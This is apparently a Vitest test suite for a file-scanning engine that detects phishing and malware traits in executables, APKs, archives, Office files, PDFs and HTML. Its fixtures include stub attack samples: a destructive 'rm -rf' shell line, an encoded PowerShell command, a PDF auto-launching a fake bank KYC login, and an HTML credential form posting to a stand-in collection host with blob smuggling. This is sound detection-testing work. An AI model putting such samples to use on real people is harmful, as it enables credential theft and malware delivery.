import { describe, expect, it } from 'vitest';
import { apkPermissionsFrom, assessFile, detectKind, fileExtension, inspectFile, peInfo, readZipEntries, sha256Hex } from '../src/engine/file.js';
import type { ReputationFinding } from '../src/shared/types.js';
import { makePe, makeZip, utf16 } from './helpers/zip.js';

const enc = new TextEncoder();
const ids = (r: { signals: Array<{ id: string }> }) => r.signals.map((s) => s.id);

function manifest(perms: string[]): Uint8Array {
  // Binary-XML-like blob: header bytes followed by UTF-16LE permission strings.
  const parts = [new Uint8Array([3, 0, 8, 0, 0, 0, 0, 0]), ...perms.map((p) => utf16(`android.permission.${p}`))];
  const out = new Uint8Array(parts.reduce((a, p) => a + p.length + 4, 0));
  let o = 0;
  for (const p of parts) {
    out.set(p, o);
    o += p.length + 4;
  }
  return out;
}

function apk(perms: string[]): Uint8Array {
  return makeZip([
    { name: 'AndroidManifest.xml', data: manifest(perms), deflate: true },
    { name: 'classes.dex', data: 'dex\n035\0' },
    { name: 'resources.arsc', data: 'x' },
  ]);
}

describe('type detection', () => {
  it.each([
    [[0x4d, 0x5a, 0x90, 0], 'windows_executable'],
    [[0x7f, 0x45, 0x4c, 0x46], 'linux_executable'],
    [[0xcf, 0xfa, 0xed, 0xfe], 'mac_executable'],
    [[0x25, 0x50, 0x44, 0x46, 0x2d, 0x31], 'pdf'],
    [[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1], 'office_legacy'],
    [[0x52, 0x61, 0x72, 0x21, 0x1a, 0x07, 0], 'rar'],
    [[0x37, 0x7a, 0xbc, 0xaf, 0x27, 0x1c], '7z'],
    [[0x89, 0x50, 0x4e, 0x47], 'image'],
    [[0x4c, 0, 0, 0, 1, 0x14, 2, 0], 'shortcut'],
  ] as const)('%j → %s', (bytes, kind) => {
    expect(detectKind(new Uint8Array(bytes))).toBe(kind);
  });

  it('detects ISO images, HTML and text', () => {
    const iso = new Uint8Array(0x8010);
    iso.set(enc.encode('CD001'), 0x8001);
    expect(detectKind(iso)).toBe('disk_image');
    expect(detectKind(enc.encode('  <!DOCTYPE html><html>'))).toBe('html');
    expect(detectKind(enc.encode('hello world\n'))).toBe('text');
    expect(detectKind(enc.encode('#!/bin/sh\nrm -rf'))).toBe('script');
  });

  it('extracts extensions safely', () => {
    expect(fileExtension('a/b/Report.PDF')).toBe('pdf');
    expect(fileExtension('.bashrc')).toBe('');
    expect(fileExtension('noext')).toBe('');
  });
});

describe('file name tricks', () => {
  it('flags right-to-left override names', async () => {
    const r = await inspectFile(makePe(false), 'invoice\u202efdp.exe');
    expect(ids(r)).toContain('file.rtlo_name');
    expect(assessFile(r).verdict).toBe('likely_phishing');
  });

  it('flags double extensions', async () => {
    const r = await inspectFile(makePe(true), 'Electricity_Bill.pdf.exe');
    expect(ids(r)).toContain('file.double_extension');
  });

  it('flags programs disguised as documents', async () => {
    const r = await inspectFile(makePe(false), 'statement.pdf');
    expect(ids(r)).toContain('file.type_mismatch');
    expect(r.signals.find((s) => s.id === 'file.type_mismatch')!.strength).toBe('strong');
  });
});

describe('Android APKs', () => {
  it('reads permissions from a compressed manifest and flags OTP-stealing apps', async () => {
    const r = await inspectFile(apk(['INTERNET', 'RECEIVE_SMS', 'READ_SMS', 'BIND_ACCESSIBILITY_SERVICE']), 'SBI_YONO_KYC_Update.apk');
    expect(r.kind).toBe('android_app');
    expect(r.apkPermissions).toEqual(expect.arrayContaining(['RECEIVE_SMS', 'READ_SMS', 'BIND_ACCESSIBILITY_SERVICE']));
    expect(r.apkPermissions).not.toContain('INTERNET');
    expect(ids(r)).toEqual(expect.arrayContaining(['file.apk_sideload', 'file.apk_lure_name', 'file.apk_perm.receive_sms']));
    const a = assessFile(r);
    expect(a.verdict).toBe('likely_phishing');
    expect(a.score).toBeGreaterThanOrEqual(60);
  });

  it('recognises an APK even with the wrong extension', async () => {
    const r = await inspectFile(apk([]), 'wedding_invitation.pdf');
    expect(r.kind).toBe('android_app');
    expect(ids(r)).toContain('file.apk_sideload');
  });

  it('stays below "likely" for an APK with no lure name or risky permissions', async () => {
    const a = assessFile(await inspectFile(apk(['INTERNET']), 'my-game.apk'));
    expect(a.verdict).not.toBe('likely_phishing');
    expect(a.verdict).not.toBe('confirmed_malicious');
  });

  it('finds UTF-8 permission strings too', () => {
    expect(apkPermissionsFrom(enc.encode('xx android.permission.SEND_SMS yy'))).toEqual(['SEND_SMS']);
  });
});

describe('archives and Office files', () => {
  it('flags programs inside password-protected archives', async () => {
    const zip = makeZip([
      { name: 'docs/readme.txt', data: 'hi' },
      { name: 'docs/Invoice.scr', data: 'MZ', encrypted: true },
    ]);
    const r = await inspectFile(zip, 'invoice.zip');
    expect(r.zip).toMatchObject({ entries: 2, encrypted: 1, executables: ['docs/Invoice.scr'] });
    expect(ids(r)).toEqual(expect.arrayContaining(['file.zip_contains_program', 'file.zip_encrypted']));
    expect(r.signals.find((s) => s.id === 'file.zip_contains_program')!.strength).toBe('strong');
  });

  it('detects macros in OOXML documents', async () => {
    const docm = makeZip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<w/>' },
      { name: 'word/vbaProject.bin', data: 'VBA' },
    ]);
    const r = await inspectFile(docm, 'Salary_Revision.docm');
    expect(r.kind).toBe('office_document');
    expect(ids(r)).toEqual(expect.arrayContaining(['file.office_macros', 'file.macro_extension']));
  });

  it('does not flag a plain document archive', async () => {
    const docx = makeZip([
      { name: '[Content_Types].xml', data: '<Types/>' },
      { name: 'word/document.xml', data: '<w/>' },
    ]);
    const r = await inspectFile(docx, 'notes.docx');
    expect(r.signals.filter((s) => s.weight > 0)).toEqual([]);
    expect(assessFile(r).verdict).toBe('no_known_threats');
  });

  it('survives damaged archives', async () => {
    const r = await inspectFile(new Uint8Array([0x50, 0x4b, 0x03, 0x04, 1, 2, 3]), 'broken.zip');
    expect(r.limitations.join(' ')).toMatch(/could not be read/);
    expect(readZipEntries(new Uint8Array(10))).toBeNull();
  });
});

describe('PDF and HTML internals', () => {
  it('flags auto-running PDF JavaScript and extracts links', async () => {
    const pdf = enc.encode('%PDF-1.7\n1 0 obj << /OpenAction 2 0 R >> endobj 2 0 obj << /S /JavaScript /JS (app.launchURL("https://sbi-kyc-update.xyz/login")) >> endobj 3 0 obj << /URI (https://evil.example/a) >> endobj');
    const r = await inspectFile(pdf, 'KYC_form.pdf');
    expect(ids(r)).toContain('file.pdf_javascript');
    expect(r.signals.find((s) => s.id === 'file.pdf_javascript')!.strength).toBe('strong');
    expect(r.embeddedUrls).toEqual(expect.arrayContaining(['https://evil.example/a', 'https://sbi-kyc-update.xyz/login']));
  });

  it('flags HTML login attachments and smuggling', async () => {
    const html = enc.encode('<!doctype html><form action="https://collect.example/p"><input type="password"></form><script>var b=new Blob([atob("TVqQ")]);URL.createObjectURL(b)</script>');
    const r = await inspectFile(html, 'Secure_Message.html');
    expect(r.kind).toBe('html');
    expect(ids(r)).toEqual(expect.arrayContaining(['file.html_login_form', 'file.html_smuggling']));
    expect(r.embeddedUrls).toContain('https://collect.example/p');
    expect(assessFile(r).verdict).toBe('likely_phishing');
  });

  it('leaves an ordinary PDF alone', async () => {
    const r = await inspectFile(enc.encode('%PDF-1.4\n1 0 obj << /Type /Catalog >> endobj'), 'statement.pdf');
    expect(r.signals).toEqual([]);
  });
});

describe('Windows programs', () => {
  it('reads Authenticode presence', () => {
    expect(peInfo(makePe(true))).toEqual({ signed: true, is64: true });
    expect(peInfo(makePe(false))).toEqual({ signed: false, is64: true });
    expect(peInfo(new Uint8Array([0x4d, 0x5a]))).toBeNull();
  });

  it('a signed installer on its own is not a warning', async () => {
    const a = assessFile(await inspectFile(makePe(true), 'vlc-setup.exe'));
    expect(a.verdict).toBe('no_known_threats');
    expect(a.limitations.join(' ')).toMatch(/not proof/);
  });

  it('scripts and shortcuts are suspicious by themselves', async () => {
    expect(assessFile(await inspectFile(enc.encode('powershell -enc AAAA'), 'update.ps1')).verdict).toBe('suspicious');
    expect(assessFile(await inspectFile(new Uint8Array([0x4c, 0, 0, 0, 1, 0x14, 2, 0]), 'photo.lnk')).verdict).toBe('suspicious');
  });
});

describe('hash reputation', () => {
  const vt = (over: Partial<ReputationFinding>): ReputationFinding => ({ providerId: 'virustotal', providerName: 'VirusTotal', status: 'no_match', checkedAt: 1, ...over });

  it('confirms only on a provider match', async () => {
    const r = await inspectFile(enc.encode('hello'), 'a.txt');
    const confirmed = assessFile(r, { sha256: 'ab', reputation: vt({ status: 'match', detections: { malicious: 40, suspicious: 1, harmless: 0, undetected: 20, total: 61 } }) });
    expect(confirmed.verdict).toBe('confirmed_malicious');
    expect(confirmed.score).toBe(100);
    expect(confirmed.signals[0]!.title).toMatch(/40 of 61/);
  });

  it('treats a minority of detections as evidence, not confirmation', async () => {
    const r = await inspectFile(enc.encode('hello'), 'a.txt');
    const a = assessFile(r, { reputation: vt({ detections: { malicious: 1, suspicious: 0, harmless: 0, undetected: 60, total: 61 } }) });
    expect(a.verdict).not.toBe('confirmed_malicious');
    expect(a.signals[0]!.id).toBe('intel.virustotal.minority');
  });

  it('says "never seen" is not a clean result', async () => {
    const a = assessFile(await inspectFile(enc.encode('x'), 'a.txt'), { reputation: vt({ status: 'no_match' }) });
    expect(a.verdict).toBe('no_known_threats');
    expect(a.limitations.join(' ')).toMatch(/never seen this file/);
  });

  it('hashes with SHA-256', async () => {
    expect(await sha256Hex(enc.encode('abc'))).toBe('ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad');
  });
});
